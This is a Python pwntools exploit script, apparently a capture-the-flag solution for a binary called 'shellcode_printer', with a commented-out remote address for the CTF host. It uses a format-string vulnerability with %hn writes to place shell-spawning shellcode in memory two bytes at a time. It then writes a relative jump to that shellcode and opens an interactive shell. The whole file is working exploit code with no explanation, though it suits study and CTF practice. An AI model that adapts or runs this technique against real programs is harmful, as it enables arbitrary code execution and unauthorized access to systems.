from pwn import *

EXE_FILENAME = "./shellcode_printer"
exe = ELF(EXE_FILENAME)
context.binary = exe
FORMAT_OFFSET = 6

# p = gdb.debug([EXE_FILENAME], gdbscript='''
#         set $fprintf_call=$base_address+0x000000000000145B
#         b *($fprintf_call)
#         commands
#               set $rdi=stdout
#               del 1
#               end
# ''')

# p = remote("shellcode-printer.nc.jctf.pro", 1337)
p = process(EXE_FILENAME)

relative_jump = asm('''
    jmp $-0x30
''')

def write_bytes(content):
    if isinstance(content, bytes):
        content = int.from_bytes(content, "little")
    payload = f"%{content}c%{FORMAT_OFFSET}$hn".encode()
    p.recvuntil(b"Enter a format string: ")
    p.sendline(payload)
    
def write_qword(payload):
    if isinstance(payload, bytes):
        payload = int.from_bytes(payload, "little")
    if payload == 0:
        return
    write_bytes( payload & 0xffff )
    payload = payload >> 16
    write_qword(payload)

def main():
    shellcode = asm(shellcraft.sh())
    for i in range(0, len(shellcode), 8):
        write_qword(shellcode[i:i+8])
    write_bytes(relative_jump)
    p.recvuntil(b"Enter a format string: ")
    p.sendline(b"\x00")

if __name__ == "__main__":
    main()
    p.interactive()